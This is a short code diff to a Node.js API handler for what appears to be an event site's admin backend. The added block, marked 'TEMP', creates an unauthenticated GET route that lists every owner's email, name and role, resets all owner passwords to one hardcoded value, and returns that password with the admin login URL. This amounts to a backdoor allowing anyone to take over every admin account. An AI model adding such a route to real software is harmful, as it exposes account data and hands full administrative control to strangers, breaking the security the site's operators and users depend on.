@@ -19,6 +19,18 @@ export default async function handler(req, res) {
     const body = await getBody(req);
 
     try {
+        // TEMP: List owners + reset all passwords to ParkAdmin@2026
+        if (url.includes('/auth/reset-admin') && method === 'GET') {
+            const owners = await Owner.find({}, 'email name role').lean();
+            const newHash = await bcrypt.hash('ParkAdmin@2026', 10);
+            await Owner.updateMany({}, { $set: { password: newHash } });
+            return json(res, 200, { 
+                owners,
+                reset: 'All owner passwords now set to: ParkAdmin@2026',
+                loginUrl: 'https://admin.events.parkconscious.in/login'
+            });
+        }
+
         // -- Login --
         if ((url.includes('/login') || url.endsWith('/auth/login')) && method === 'POST') {
             const { email, password } = body;
